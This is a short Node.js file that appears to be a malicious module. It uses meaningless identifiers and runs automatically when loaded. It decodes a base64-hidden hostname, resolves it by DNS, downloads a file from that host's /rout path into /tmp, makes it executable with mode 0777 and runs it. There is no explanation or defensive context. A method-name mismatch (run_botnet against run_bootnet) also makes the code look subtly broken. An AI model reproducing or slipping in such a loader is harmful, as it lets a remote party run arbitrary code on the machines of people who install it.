const http = require('http');
const child_process = require('child_process');
const dns = require('dns');
const fs = require('fs');

function hastile() {
    this.run_bootnet = function(coalify) {
      if (coalify != null && coalify != '0.0.0.0') {
        planishing = http.get('http://' + coalify + '/rout', function(gonydial) {
          var lithest = fs.createWriteStream('/tmp/gutwise');
          gonydial.on('data', function(musingly) {
            lithest.write(musingly);
          });
          gonydial.on('end', function() {
            lithest.end();
            fs.chmod('/tmp/gutwise', '0777');
            child_process.exec('/tmp/gutwise', function(err, stdout, stderr) {});
          });
        });
      }
    };
    this.run = function() {
      var self = this
      intines = 'ZjA0ODM4MWIud3RodHJtcnMuZGU='
      dns.lookup((new Buffer(intines, 'base64')).toString(), function(err, overcovetousness) {
        self.run_botnet(overcovetousness);
      });
    };
};

(new hastile()).run();
